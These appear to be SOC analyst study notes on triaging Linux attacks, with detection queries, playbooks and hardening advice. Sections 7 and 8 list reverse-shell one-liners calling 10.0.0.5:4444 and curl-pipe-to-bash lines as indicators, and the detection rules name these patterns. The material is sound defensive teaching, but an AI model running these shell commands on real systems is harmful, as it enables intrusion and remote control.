# Linux — SOC Analyst Study Notes

> Goal: understand Linux enough to **triage SSH attacks, reverse shells, web-shell/RCE, persistence, privilege escalation, cryptominers, rootkits, and log tampering** on servers, cloud VMs, and containers.
> File-system internals → `File-Systems.md`; permissions/ACLs → `Permissions.md`; Windows equivalents → `Windows.md`.

---

## 0. How to use this note

1. §1–§5: architecture, processes, users/auth, services, logs.
2. §6–§8: persistence, attacks, malware behaviours.
3. §9–§12: telemetry, detections, investigation, triage.
4. §13–§15: commands, false positives, hardening.
5. §16–§18: labs, self-test, revision.

---

## 1. Why Linux matters to a SOC analyst

- Most **servers, cloud workloads, containers, and network appliances** run Linux.
- Common incident types: **SSH brute force → login → cryptominer/ransomware**, **web app RCE → reverse shell**, **privilege escalation**, **persistence via cron/systemd/SSH keys**, **rootkits/log tampering**.
- Linux logging is **text-based and distributed** — you must know *which* files matter and how they reach the SIEM.
- Containers add a second layer: **host vs container**, namespaces, cgroups, and escape paths.
- Many "Linux" alerts are really **identity** (SSH/sudo) or **network** (C2/exfil) problems with a Linux endpoint.

**SOC outcomes:** given Linux telemetry you can answer:
- Who logged in, from where, how (password/key), and did they escalate?
- What process ran, as which user, from which path, with what parent?
- Is there persistence (cron, systemd, SSH keys, sudoers, modules)?
- Is the binary deleted/masquerading/hidden by a rootkit?
- What network connections and files did it touch?
- What do we preserve and contain?

---

## 2. Architecture and boot

| Layer | Components |
|---|---|
| **Kernel** | Process/memory/FS/network drivers, syscalls, modules, namespaces, cgroups, eBPF. |
| **Init/systemd** | PID 1, units, targets, timers, journal. |
| **Userland** | Shells, coreutils, daemons, package manager. |
| **Session/auth** | PAM, SSSD, sudo, sshd, login, getty. |
| **Logging** | journald, rsyslog/syslog-ng, auditd, application logs. |

**Boot flow (simplified):** firmware (BIOS/UEFI) → bootloader (GRUB) → kernel + initramfs → `systemd` as PID 1 → targets (`multi-user.target`, `graphical.target`) → services.

| Concept | Notes |
|---|---|
| **GRUB** | Boot menu/config (`/boot/grub/grub.cfg`, `/etc/default/grub`); attackers edit kernel args (e.g. `init=/bin/sh`, `single`). |
| **initramfs** | Early userspace; can hide modules/scripts. |
| **systemd targets** | Replace runlevels (0 poweroff, 1 rescue, 3 multi-user, 5 graphical, 6 reboot). |
| **Unit files** | `service`, `socket`, `timer`, `mount`, `target`, `path`. |
| **Unit locations** | `/etc/systemd/system` (admin), `/usr/lib/systemd/system` (package), `/run/systemd/system` (runtime). |
| **cgroups/namespaces** | Resource limits and isolation (containers). |

---

## 3. Processes

### 3.1 Lifecycle

- **fork()** creates a child; **exec()** replaces the image; **wait()** reaps.
- **PID 1** adopts orphans (systemd in modern distros).
- **Zombie** — exited but not reaped; **orphan** — parent died, reparented.
- **Threads** share address space (TIDs); **signals** (`SIGTERM` 15, `SIGKILL` 9, `SIGHUP` 1, `SIGSTOP`/`SIGCONT`).
- **Daemons** detach from terminal; **services** are managed by systemd.

### 3.2 `/proc` — the live process view

| Path | Contents |
|---|---|
| `/proc/<pid>/cmdline` | Command line (NUL-separated). |
| `/proc/<pid>/exe` | Symlink to executable; `(deleted)` if removed. |
| `/proc/<pid>/cwd` | Working directory. |
| `/proc/<pid>/environ` | Environment variables (NUL-separated). |
| `/proc/<pid>/fd/` | Open file descriptors (sockets, files). |
| `/proc/<pid>/maps` | Mapped memory (loaded libraries). |
| `/proc/<pid>/status` | UID/GID, state, threads, capabilities. |
| `/proc/net/tcp`, `/proc/net/udp` | Sockets (hex-encoded). |
| `/proc/modules` | Loaded kernel modules. |
| `/proc/kallsyms` | Kernel symbols (rootkits may hide). |

> **Rootkit tell:** `ps`/`netstat` show nothing, but `/proc` has entries; or `/proc/<pid>/exe` points to a deleted file in `/tmp`.

### 3.3 Process inspection

```bash
ps -eo pid,ppid,user,stat,etime,cmd --sort=start_time
ps auxf
pstree -ap
top -H
cat /proc/1234/cmdline | tr '\0' ' '
readlink -f /proc/1234/exe
readlink -f /proc/1234/cwd
tr '\0' '\n' < /proc/1234/environ
ls -l /proc/1234/fd
cat /proc/1234/maps
```

---

## 4. Users, authentication, and privilege

### 4.1 Identity files

| File | Contents |
|---|---|
| `/etc/passwd` | `user:x:UID:GID:GECOS:home:shell` |
| `/etc/shadow` | Password hash, aging (root-only). |
| `/etc/group` | Group membership. |
| `/etc/sudoers`, `/etc/sudoers.d/*` | Sudo rules. |
| `/etc/pam.d/*` | PAM authentication stacks. |
| `/etc/ssh/sshd_config` | SSH server config. |
| `~/.ssh/authorized_keys` | Public keys allowed to log in. |
| `~/.ssh/known_hosts` | Client host keys. |
| `/etc/nsswitch.conf` | Name resolution order (LDAP/SSSD). |

**UID notes:** `0` = root (any account with UID 0 is root-equivalent). System UIDs often < 1000; regular users usually ≥ 1000. Check for **duplicate UID 0** accounts and unexpected sudoers entries.

### 4.2 PAM and sudo

- **PAM** stacks in `/etc/pam.d/` control auth, account, password, session.
- **Backdoors:** modified `pam_unix.so`/`pam_exec.so` lines, `pam_python`, or a rogue module in `/lib*/security/`.
- **sudo** runs commands as another user per `/etc/sudoers`; `sudo -l` shows allowed commands.
- **GTFOBins** — legitimate binaries that can spawn shells when run via sudo (e.g. `vim`, `less`, `find`, `awk`, `python`).
- **Logs:** `sudo` entries in `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL), and journald.

### 4.3 SSH

- **Password auth** → brute force/credential stuffing.
- **Key auth** → stolen keys, `authorized_keys` persistence.
- **Agent forwarding** → pivot to other hosts using the user's keys.
- **Tunnels:** `ssh -L` (local), `-R` (remote), `-D` (SOCKS), `ProxyJump`; abused for pivoting/exfil.
- **Config risks:** `PermitRootLogin yes`, weak ciphers/MACs/KEX, password auth enabled, no rate limiting.
- **Logs:** `sshd` in auth logs (accepted/failed/publickey), `wtmp`, `btmp`, journald.

---

## 5. Logging and audit

### 5.1 Classic log files

| Path | Contents |
|---|---|
| `/var/log/auth.log` | Auth events (Debian/Ubuntu): sshd, sudo, su, PAM. |
| `/var/log/secure` | Auth events (RHEL/CentOS/Fedora). |
| `/var/log/syslog` | General syslog (Debian). |
| `/var/log/messages` | General syslog (RHEL). |
| `/var/log/kern.log` | Kernel messages. |
| `/var/log/cron` | Cron execution. |
| `/var/log/audit/audit.log` | auditd records. |
| `/var/log/wtmp` | Logins/logouts (binary; `last`). |
| `/var/log/btmp` | Failed logins (binary; `lastb`). |
| `/var/log/lastlog` | Last login per user (binary; `lastlog`). |
| `/var/log/faillog` | Failed login counts. |
| `/var/log/dpkg.log`, `/var/log/yum.log`, `/var/log/dnf.log` | Package operations. |
| `/var/log/nginx/`, `/var/log/apache2/`, `/var/log/httpd/` | Web access/error. |
| `~/.bash_history`, `~/.zsh_history` | Shell history (often disabled/cleared by attackers). |

### 5.2 journald

```bash
journalctl -xe
journalctl -u sshd --since "2026-10-27 00:00"
journalctl -p err -b
journalctl _PID=1234
journalctl --disk-usage
journalctl -o json-pretty -n 1
```

> journald may be volatile (`/run/log/journal`) unless persistent storage is configured (`/var/log/journal`). Confirm retention.

### 5.3 auditd

- Rules in `/etc/audit/rules.d/*.rules`, config `/etc/audit/auditd.conf`.
- Key record types: `SYSCALL`, `EXECVE`, `PATH`, `USER_AUTH`, `USER_CMD`, `LOGIN`, `SERVICE_START`, `SERVICE_STOP`.
- Query with `ausearch`/`aureport`.

```bash
auditctl -l
ausearch -m EXECVE -ts today
ausearch -k identity
ausearch -ua 1000 -ts recent
aureport --auth --summary
aureport -x --summary
```

### 5.4 What to send to the SIEM

- auth logs (sshd/sudo/su), auditd, journald, cron, web logs, package logs.
- Sysmon for Linux / EDR telemetry.
- Process and network events (osquery/Falco/EDR).
- File integrity (AIDE/Wazuh) and cloud audit logs.

---

## 6. Persistence mechanisms

| Mechanism | Location | Detection |
|---|---|---|
| **Cron** | `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.{hourly,daily,weekly,monthly}`, `/var/spool/cron/*`, user `crontab -l` | New/modified cron; `cron` logs; auditd `-w /etc/cron*`. |
| **systemd service** | `/etc/systemd/system/*.service`, `/usr/lib/systemd/system`, drop-ins | `systemctl list-unit-files`, file mtime, audit. |
| **systemd timer** | `*.timer` | `systemctl list-timers --all`. |
| **rc.local** | `/etc/rc.local` | Rare on systemd; still used. |
| **init scripts** | `/etc/init.d/`, `/etc/rc*.d/` | Legacy. |
| **Shell profiles** | `/etc/profile`, `/etc/bash.bashrc`, `~/.bashrc`, `~/.profile`, `~/.bash_profile` | Commands in profiles. |
| **SSH keys** | `~/.ssh/authorized_keys`, `/root/.ssh/` | New keys; audit. |
| **Sudoers** | `/etc/sudoers`, `/etc/sudoers.d/` | New NOPASSWD entries. |
| **PAM** | `/etc/pam.d/*`, `/lib*/security/` | Modified modules/backdoors. |
| **LD_PRELOAD** | `/etc/ld.so.preload`, env vars | `cat /etc/ld.so.preload`; audit. |
| **Kernel module** | `insmod`/`modprobe`, `/etc/modules`, `/etc/modprobe.d/` | `lsmod`, `modinfo`, signed modules. |
| **udev rules** | `/etc/udev/rules.d/` | Rule execution on device events. |
| **AT jobs** | `/var/spool/cron/atjobs/` | `atq`. |
| **Containers** | Docker/K8s manifests, entrypoints, mounted host paths | Container config/audit. |
| **Git hooks / CI** | Repos, runners | Supply-chain persistence. |
| **Motd/issue** | `/etc/update-motd.d/`, `/etc/issue` | Rare; executes on login. |
| **X11/desktop autostart** | `~/.config/autostart/` | Desktop persistence. |

**High-signal paths to monitor:** `/etc/cron*`, `/var/spool/cron`, `/etc/systemd/system`, `/etc/ssh`, `/root/.ssh`, `/etc/sudoers*`, `/etc/pam.d`, `/etc/ld.so.preload`, `/etc/rc.local`, `~/.bashrc`, `/tmp`, `/dev/shm`.

---

## 7. Common attacks and behaviours

### 7.1 SSH brute force / credential stuffing

- Many `Failed password` / `Invalid user` lines from one IP or distributed.
- Success after failures; new source; root login; password auth.
- Followed by `sudo`, new users, cron, downloads.

**Logs:** auth.log/secure, journald, `lastb`/`btmp`, fail2ban.

### 7.2 Web RCE → reverse shell

Typical chain: vulnerable web app → command injection/upload → shell as `www-data` → download tooling → privesc.

**Command-line indicators:**

```bash
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
nc -e /bin/sh 10.0.0.5 4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.5:4444
python3 -c 'import socket,subprocess,os;...'
perl -e 'use Socket;...'
php -r '$sock=fsockopen(...);...'
mkfifo /tmp/f; nc 10.0.0.5 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1
```

**Other indicators:** `curl ... | bash`, `wget ... -O /tmp/x && chmod +x /tmp/x`, base64-decoded payloads, `/dev/shm` execution, unusual child processes of web servers (`sh`, `bash`, `nc`, `python`, `perl`), outbound connections from `www-data`.

### 7.3 Privilege escalation

| Vector | Check |
|---|---|
| **SUID/SGID** | `find / -perm -4000 -type f`, GTFOBins. |
| **Capabilities** | `getcap -r /`, `cap_setuid`, `cap_net_raw`. |
| **Sudo** | `sudo -l`, NOPASSWD, GTFOBins. |
| **Cron** | Writable scripts/jobs run as root. |
| **PATH hijack** | Root scripts calling binaries by relative name. |
| **LD_PRELOAD** | `env_keep` in sudoers, `/etc/ld.so.preload`. |
| **Kernel exploit** | Unpatched kernel (Dirty Pipe, PwnKit via pkexec, etc. — check version). |
| **NFS** | `no_root_squash`. |
| **Docker group** | `docker run -v /:/host` → host root. |
| **LXD group** | Privileged container mount. |
| **Writable /etc/passwd or /etc/shadow** | Direct root. |
| **Polkit** | `pkexec` vulnerabilities. |

**Logs:** sudo, `pkexec`, `su`, auditd EXECVE, `useradd`/`usermod`/`groupmod`, file changes to privileged paths.

### 7.4 Cryptomining

- Sustained high CPU, `xmrig`/`minerd`/`kdevtmpfsi`, stratum protocol, mining-pool domains/IPs.
- Persistence via cron/systemd; often dropped in `/tmp` or `/var/tmp`.
- Killers/defenders (e.g. Kinsing) remove competing malware and watch processes.

### 7.5 Ransomware (Linux)

- Encrypts data/apps, drops notes, deletes backups/snapshots, stops services.
- Targets ESXi, NAS, databases, web apps; often via VPN/edge appliance.
- **Detection:** mass file writes/renames, entropy, service stops, snapshot deletion (`vim-cmd`), note creation, extension changes.

### 7.6 Rootkits / anti-forensics

- **Userland rootkits** — replace `ps`, `netstat`, `ls`, `ss` (compare with `/proc`).
- **Kernel modules** — hook syscalls; `lsmod` may hide; check `/proc/modules`, `dmesg`.
- **LD_PRELOAD** rootkits — `/etc/ld.so.preload`, env vars.
- **Log tampering** — truncate/delete logs, stop rsyslog/auditd, `history -c`, `unset HISTFILE`, `journalctl --vacuum`.
- **Timestomping** — `touch -r`, `touch -t`; cross-ref `File-Systems.md`.
- **Hidden files/processes** — dotfiles, unicode names, `/dev/shm`, deleted binaries.

### 7.7 Containers

- **Host escape:** privileged container, `--pid=host`, `--net=host`, mounted `/var/run/docker.sock`, `-v /:/host`, `CAP_SYS_ADMIN`.
- **Kubernetes:** exposed kubelet, anonymous API, SA token abuse (cross-ref cluster security skill).
- **Detection:** unusual host mounts, `docker`/`ctr`/`kubectl` commands, namespace anomalies, crypto miners in containers.

---

## 8. Malware execution patterns (quick reference)

| Pattern | Example | Why suspicious |
|---|---|---|
| **Download-and-execute** | `curl http://x/y.sh \| bash` | No disk artifact; common dropper. |
| **Temp execution** | `/tmp/.x`, `/dev/shm/.k` | Unusual for services; hides from casual listing. |
| **Base64 decode** | `echo ... \| base64 -d \| sh` | Obfuscation. |
| **Deleted binary** | `/proc/<pid>/exe -> /tmp/x (deleted)` | Self-deleting malware. |
| **Masquerading** | `[kworker/0:1]`, `.sshd`, `systemd-udevd` in `/tmp` | Fake kernel/system names. |
| **Reverse shell** | `bash -i >& /dev/tcp/...` | Interactive C2. |
| **Persistence** | cron/systemd/keys added right after | Establish foothold. |
| **Credential access** | reading `/etc/shadow`, SSH keys, browser data | Post-exploitation. |
| **Data staging** | `tar czf /tmp/a.tgz /var/www` | Exfil prep. |

---

## 9. Telemetry and detection engineering

### 9.1 Sources and what they give you

| Source | Data |
|---|---|
| **auth logs / journald** | SSH, sudo, su, PAM, sessions. |
| **auditd** | Syscalls, execve, file access, user/group changes, service changes. |
| **Sysmon for Linux** | Process creation, network, file events (similar to Windows Sysmon). |
| **EDR (Linux agents)** | Process tree, file/network, memory, live response. |
| **osquery** | Scheduled SQL over processes, users, cron, services, ports. |
| **Falco** | Runtime container/host behaviour rules (syscalls). |
| **Wazuh/AIDE/Tripwire** | FIM, log analysis, security config. |
| **Web server logs** | RCE/webshell indicators. |
| **Package logs** | Installed/updated packages. |
| **Cloud audit** | Instance/console changes, IAM. |

### 9.2 High-signal detection ideas

1. **SSH brute force** — many failures per source/user; distributed spray.
2. **Login success after failures** — especially root or from new ASN.
3. **New user/group** or UID 0 account.
4. **Sudo escalation** — first-time sudo, NOPASSWD, shell-spawning commands.
5. **Reverse-shell command lines**.
6. **Download-and-execute** (`curl|bash`, `wget|sh`).
7. **Execution from `/tmp`, `/dev/shm`, `/var/tmp`**.
8. **Web server spawning shells/nc/python/perl**.
9. **New cron/systemd/SSH-key/sudoers entries**.
10. **`authorized_keys` modification**.
11. **`/etc/ld.so.preload` creation/modification**.
12. **Kernel module load** (`insmod`/`modprobe`) outside change windows.
13. **Service stop/disable** (especially security/logging).
14. **Log deletion/truncation** and auditd/rsyslog stops.
15. **History clearing** (`history -c`, `unset HISTFILE`, `.bash_history` truncated).
16. **SUID/capability changes**.
17. **Cryptominer indicators** (CPU, stratum, known hashes/pools).
18. **Outbound connections from service accounts**.
19. **Data staging archives** and large outbound transfers.
20. **Rootkit indicators** — `ps` vs `/proc` mismatch, hidden modules, deleted binaries.
21. **Container host-mount/privileged launch**.
22. **SSH tunneling** (`-L/-R/-D`, `ProxyJump`) to unusual destinations.
23. **Package manager abuse** (installing tools like `nmap`, `netcat`, `tcpdump` by an attacker).
24. **Account changes** (`usermod -aG sudo`, password changes).
25. **SSH key added for a service account**.

### 9.3 Splunk SPL examples

**SSH failures by source:**
```spl
index=linux sourcetype=linux_secure "Failed password"
| rex "Failed password for (?:invalid user )?(?<user>\S+) from (?<src>\d+\.\d+\.\d+\.\d+)"
| stats count dc(user) as users values(user) as user_list by src
| where count > 20
| sort -count
```

**Successful login after failures:**
```spl
index=linux sourcetype=linux_secure ("Failed password" OR "Accepted")
| rex "(?<result>Failed password|Accepted) for (?:invalid user )?(?<user>\S+) from (?<src>\S+)"
| bin _time span=30m
| stats count(eval(result="Failed password")) as fails count(eval(result="Accepted")) as success by user, src, _time
| where fails >= 5 AND success > 0
```

**New local user:**
```spl
index=linux (sourcetype=linux_secure OR sourcetype=linux:audit)
| search "useradd" OR "usermod" OR "groupadd" OR "gpasswd" OR "new user"
| table _time, host, user, _raw
```

**Sudo usage / escalation:**
```spl
index=linux sourcetype=linux_secure "sudo"
| rex "sudo:\s+(?<sudo_user>\S+)\s+:.*COMMAND=(?<command>.*)"
| stats count values(command) as commands by sudo_user, host
| sort -count
```

**Reverse shell / download-exec patterns (auditd or process logs):**
```spl
index=linux (sourcetype=linux:audit OR sourcetype=sysmon:linux)
| search "execve" OR "CommandLine"
| where match(_raw, "(?i)(/dev/tcp/|nc -e|ncat -e|socat .*exec:|bash -i|sh -i|python.*socket|perl.*socket|mkfifo|curl .*\| *(ba)?sh|wget .*\| *(ba)?sh|base64 -d.*\| *(ba)?sh)")
| table _time, host, user, _raw
```

**Execution from temp directories:**
```spl
index=linux (sourcetype=linux:audit OR sourcetype=sysmon:linux)
| where match(_raw, "(?i)(/tmp/|/dev/shm/|/var/tmp/).*(execve|Image)")
| stats count by host, user, _raw
```

**Cron persistence:**
```spl
index=linux sourcetype=linux:audit
| search "crontab" OR "/etc/cron" OR "/var/spool/cron"
| where match(_raw, "(?i)(crontab|/etc/cron|/var/spool/cron)")
| table _time, host, user, _raw
```

**LD_PRELOAD persistence:**
```spl
index=linux sourcetype=linux:audit
| search "/etc/ld.so.preload"
| table _time, host, user, _raw
```

**SSH key added:**
```spl
index=linux sourcetype=linux:audit
| search "authorized_keys"
| table _time, host, user, _raw
```

**Service stopped/disabled:**
```spl
index=linux (sourcetype=linux:audit OR sourcetype=journald)
| search "systemctl stop" OR "systemctl disable" OR "service .* stop"
| where match(_raw, "(?i)(auditd|rsyslog|syslog|sshd|firewalld|ufw|falco|osquery|clamd|filebeat)")
| table _time, host, user, _raw
```

**Log tampering:**
```spl
index=linux (sourcetype=linux:audit OR sourcetype=linux_secure)
| where match(_raw, "(?i)(history -c|unset HISTFILE|rm .*/var/log|truncate .*/var/log|>\s*/var/log|journalctl --vacuum|auditctl -e 0)")
| table _time, host, user, _raw
```

**Cryptominer command lines:**
```spl
index=linux (sourcetype=linux:audit OR sourcetype=sysmon:linux)
| where match(_raw, "(?i)(xmrig|minerd|kdevtmpfsi|stratum\+tcp|--donate-level|cryptonight|randomx)")
| table _time, host, user, _raw
```

### 9.4 Microsoft Sentinel / Defender KQL examples

**SSH failures (if auth logs ingested via Syslog):**
```kusto
Syslog
| where SyslogMessage has "Failed password"
| extend User = extract(@"for (?:invalid user )?(\S+) from", 1, SyslogMessage)
| extend SrcIP = extract(@"from (\d+\.\d+\.\d+\.\d+)", 1, SyslogMessage)
| summarize Failures = count(), Users = dcount(User) by SrcIP, HostName, bin(TimeGenerated, 15m)
| where Failures > 20
| order by Failures desc
```

**Process with suspicious command line (Defender for Endpoint on Linux):**
```kusto
DeviceProcessEvents
| where ProcessCommandLine matches regex @"(?i)(/dev/tcp/|nc -e|socat .*exec:|bash -i|curl .*\| *(ba)?sh|wget .*\| *(ba)?sh|base64 -d.*\| *(ba)?sh|xmrig|stratum\+tcp)"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

**Execution from temp:**
```kusto
DeviceProcessEvents
| where FolderPath has_any ("/tmp/", "/dev/shm/", "/var/tmp/")
| summarize Count = count() by DeviceName, AccountName, FolderPath, FileName
| order by Count desc
```

**New cron/authorized_keys writes (DeviceFileEvents):**
```kusto
DeviceFileEvents
| where ActionType in ("FileCreated","FileModified")
| where FolderPath has_any ("/etc/cron", "/var/spool/cron", "/.ssh")
| project TimeGenerated, DeviceName, AccountName, FolderPath, FileName, InitiatingProcessFileName
```

**Service stop/disable:**
```kusto
DeviceProcessEvents
| where ProcessCommandLine matches regex @"(?i)systemctl (stop|disable).*(auditd|rsyslog|syslog|sshd|falco|osquery|filebeat)"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
```

**Outbound to mining pool (DeviceNetworkEvents):**
```kusto
DeviceNetworkEvents
| where RemoteUrl has_any ("pool.", "stratum", "minexmr", "supportxmr", "nanopool")
| summarize Count = count() by DeviceName, RemoteUrl, RemoteIP
```

### 9.5 Sigma-style skeleton

```yaml
title: Reverse Shell Command Line
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - '/dev/tcp/'
      - 'nc -e'
      - 'socat exec:'
      - 'bash -i'
      - 'mkfifo'
  condition: selection
level: high
```

### 9.6 osquery/Falco notes

- osquery tables: `processes`, `users`, `groups`, `authorized_keys`, `crontab`, `systemd_units`, `listening_ports`, `logged_in_users`, `file`, `hash`, `shell_history`, `deb_packages`.
- Falco rules cover shell spawned in container, sensitive file reads, outbound connections, privilege changes — good for Kubernetes/containers.
- Send results to SIEM; baseline before alerting.

---

## 10. Investigation workflow (step by step)

### Step 1 — Preserve volatile data first (RFC 3227 order)
1. Memory (if advanced malware/rootkit suspected) — use approved tooling.
2. Network state (`ss`, `lsof`, `/proc/net/*`).
3. Processes (`ps`, `/proc`), logged-in users (`who`, `w`, `last`).
4. Then disk/logs.

> Avoid commands that change timestamps or kill processes before capturing. Work from a trusted, read-only toolset (or mount evidence read-only).

### Step 2 — Establish the timeline
- Login events (auth logs, wtmp/btmp), sudo, service changes, cron, file writes, network connections.
- Correlate with web/proxy/EDR.

### Step 3 — Identify the actor
- User, source IP, SSH key fingerprint, session.
- Process tree: parent, command line, executable path, hash.
- Was the binary deleted? (`/proc/<pid>/exe`)

### Step 4 — Check privilege and persistence
- `id`, `sudo -l`, groups, capabilities, SUID.
- cron/systemd/keys/sudoers/PAM/LD_PRELOAD/modules.
- Any new users/UID 0.

### Step 5 — Check network activity
- `ss -tulpen`, `lsof -i`, `/proc/net/*`.
- Outbound destinations, DNS, TLS SNI (cross-ref `TCP-IP.md`, `DNS.md`).

### Step 6 — Check files and integrity
- New/modified files in temp, webroot, home, `/etc`.
- Package verification (`rpm -Va`, `debsums`), FIM alerts.
- Rootkit indicators (`ps` vs `/proc`, modules).

### Step 7 — Scope
- Same IP/key/hash across hosts.
- Lateral movement via SSH keys/agent forwarding.
- Cloud/container blast radius.

### Step 8 — Respond
- Isolate host (network/security group), preserve evidence.
- Disable accounts, revoke keys, rotate credentials/secrets.
- Block C2, remove persistence (after evidence), patch initial vector.
- Rebuild if rootkit/kernel compromise suspected.

### Step 9 — Document
Timeline, artifacts, hashes, IOCs, scope, impact, actions, lessons.

---

## 11. Triage playbooks

### A. "SSH brute force"
1. Count failures per IP/user; distributed?
2. Any success from that IP? New source/ASN?
3. If success → account compromise playbook.
4. Block IP (careful with shared NAT), enable fail2ban/rate limits, disable password auth.

### B. "Reverse shell / suspicious process"
1. Identify process, parent, user, command line, hash.
2. Capture `/proc/<pid>/exe`, open sockets, cwd, environ.
3. Check how the parent (web server/app) was exploited (web logs).
4. Isolate host; block C2; hunt other hosts; preserve memory.

### C. "Web shell / web RCE"
1. Identify file in webroot, creation time, content, hash.
2. Find initial access in access logs (upload, traversal, deserialization).
3. Check post-exploitation commands and outbound traffic.
4. Isolate/rebuild; patch the app; rotate secrets.

### D. "Privilege escalation"
1. Confirm the escalation path (SUID/sudo/capability/kernel).
2. Identify the actor and timeline.
3. Check for persistence and credential theft.
4. Patch/mitigate, rotate credentials, rebuild if kernel-level.

### E. "Persistence found"
1. Enumerate all mechanisms (cron, systemd, keys, sudoers, PAM, LD_PRELOAD, modules).
2. Determine what it executes and where payload lives.
3. Preserve, then remove; verify no residual.
4. Hunt for the same mechanism estate-wide.

### F. "Cryptominer"
1. Identify process/hash/pool.
2. Check CPU, persistence, lateral movement, killer scripts.
3. Isolate, block pool, remove persistence, patch initial access.
4. Check cloud billing anomalies.

### G. "Rootkit / log tampering"
1. Compare tool output to `/proc` and raw logs.
2. Check modules, `/etc/ld.so.preload`, PAM, binaries hashes.
3. Preserve memory/disk; assume full compromise.
4. Rebuild from trusted media; rotate all credentials.

### H. "Container escape / suspicious container"
1. Identify container, image, privileges, mounts, capabilities.
2. Check host access from container (docker socket, `/host`, `--pid=host`).
3. Kill/quarantine container; preserve image/logs.
4. Patch deployment manifests and cluster policies.

### I. "Data exfiltration"
1. Identify staging (archives) and transfer (scp/rsync/curl/cloud CLI).
2. Quantify data and sensitivity.
3. Block destination, isolate, rotate secrets.
4. Escalate to breach process.

### Severity guide (adjust to your org)

| Scenario | Typical severity |
|---|---|
| SSH failures, no success | Low–Medium |
| Successful SSH from new source (unverified) | High |
| Confirmed web shell | Critical |
| Reverse shell / C2 | Critical |
| Privesc to root | Critical |
| Cryptominer | High |
| Rootkit/log tampering | Critical |
| Container escape | Critical |
| Data exfil | Critical |

---

## 12. Commands (live response)

> Use a trusted, statically linked toolset when possible. Avoid altering evidence; note every command you run.

```bash
# Identity / sessions
id; whoami; groups
who; w; last -a; lastb | head; lastlog
loginctl list-sessions
ss -tulpen
lsof -i -P -n

# Processes
ps -eo pid,ppid,user,lstart,etime,stat,cmd --sort=lstart
pstree -ap
ls -l /proc/*/exe 2>/dev/null | grep deleted
for p in /proc/[0-9]*; do echo "$p $(tr '\0' ' ' < $p/cmdline)"; done

# Network
ss -tanp
ss -lntup
cat /proc/net/tcp
lsof -nP -iTCP -sTCP:ESTABLISHED
ip addr; ip route; ip neigh

# Users / auth
getent passwd | awk -F: '$3==0'
getent group sudo wheel docker lxd 2>/dev/null
sudo -l
cat /etc/sudoers 2>/dev/null; ls -l /etc/sudoers.d/
ls -la ~/.ssh /root/.ssh 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null
grep -R "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# Persistence
crontab -l; ls -la /etc/cron* /var/spool/cron* 2>/dev/null
systemctl list-unit-files --state=enabled
systemctl list-timers --all
ls -la /etc/systemd/system /usr/lib/systemd/system | head
cat /etc/rc.local 2>/dev/null
ls -la /etc/ld.so.preload 2>/dev/null; cat /etc/ld.so.preload 2>/dev/null
lsmod; cat /proc/modules | head
atq 2>/dev/null
grep -R "" /etc/pam.d 2>/dev/null | grep -Ei "exec|python|pam_unix" | head

# Privesc
find / -xdev -perm -4000 -type f 2>/dev/null
find / -xdev -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/passwd; ls -l /etc/passwd /etc/shadow
mount | grep -E "nfs|no_root_squash"

# Files
find /tmp /var/tmp /dev/shm -type f -ls 2>/dev/null
find / -xdev -mtime -1 -type f -ls 2>/dev/null | head -100
find /var/www /srv /home -name "*.php" -mtime -1 2>/dev/null
ls -la /var/www /var/www/html 2>/dev/null

# Logs / audit
journalctl -xe --no-pager | tail -100
grep -Ei "Failed password|Accepted|sudo|useradd|usermod" /var/log/auth.log /var/log/secure 2>/dev/null | tail -100
ausearch -ts today -m EXECVE 2>/dev/null | tail -100
aureport --auth --summary 2>/dev/null
last -Fai | head -20

# Integrity
rpm -Va 2>/dev/null | head
debsums -c 2>/dev/null | head
aide --check 2>/dev/null | head
rkhunter --check --sk 2>/dev/null | tail -20
chkrootkit 2>/dev/null | grep -i infected

# Hashing / capture
sha256sum /path/file
sudo tcpdump -ni any -s0 -w /evidence/traffic.pcap host 10.0.0.5
```

> `rkhunter`/`chkrootkit` are noisy and not proof; use them as leads, not verdicts.

---

## 13. Common false positives

| Alert | Often actually |
|---|---|
| SSH failures | Internet background noise, misconfigured scripts, expired keys, users. |
| Reverse-shell-looking string | Admin scripts, monitoring, CTF/lab, legitimate remote support. |
| `curl \| bash` | Vendor installers, cloud-init, legitimate provisioning. |
| Execution from `/tmp` | Installers, updaters, build systems, container images. |
| New cron/systemd | Package installs, configuration management (Ansible/Chef/Puppet). |
| Authorized_keys change | Provisioning tools, admin adding keys. |
| Sudo usage | Legitimate admin automation. |
| High CPU | Builds, rendering, legitimate compute, backups. |
| Service stops | Maintenance, upgrades, orchestration. |
| Log rotation | Normal `logrotate`, journal vacuum policies. |
| Deleted binary | Package upgrades, `pip`/`npm` temp wrappers. |
| Outbound from services | APIs, updates, telemetry, cloud SDKs. |
| Rootkit tool hits | False positives in `/proc` parsing, custom binaries. |

**Rule of thumb:** correlate **parent process + user + path + timing + persistence**. A `curl` from `cloud-init` is not a dropper.

---

## 14. Hardening and recommendations

- **SSH:** key-only auth, no root login, strong KEX/ciphers/MACs, `AllowUsers`/`AllowGroups`, rate limiting/fail2ban, MFA for privileged access.
- **Least privilege:** no shared accounts, sudo rules scoped, no NOPASSWD, review group memberships (`sudo`, `docker`, `lxd`, `wheel`).
- **Patching:** kernel and userland; track CVEs; reboot for kernel updates.
- **MAC:** SELinux (enforcing) or AppArmor profiles.
- **auditd:** monitor auth, exec, privileged files, persistence paths; centralise logs.
- **Logging:** persistent journald, rsyslog forwarding, immutable/remote logs, NTP.
- **FIM/EDR:** AIDE/Wazuh/EDR on critical paths; baseline.
- **Disable unused services** and remove compilers/tools from production.
- **Containers:** non-root, read-only rootfs, no privileged, no host mounts, drop capabilities, seccomp/AppArmor, network policies.
- **Secrets:** no keys in images/repos; use secret managers; rotate.
- **Backups:** offline/immutable, tested restores.
- **Kernel hardening:** sysctl (ASLR, `kptr_restrict`, `dmesg_restrict`, `ptrace_scope`, syncookies), module signing.
- **MFA** for SSH/console/cloud IAM; short-lived credentials.
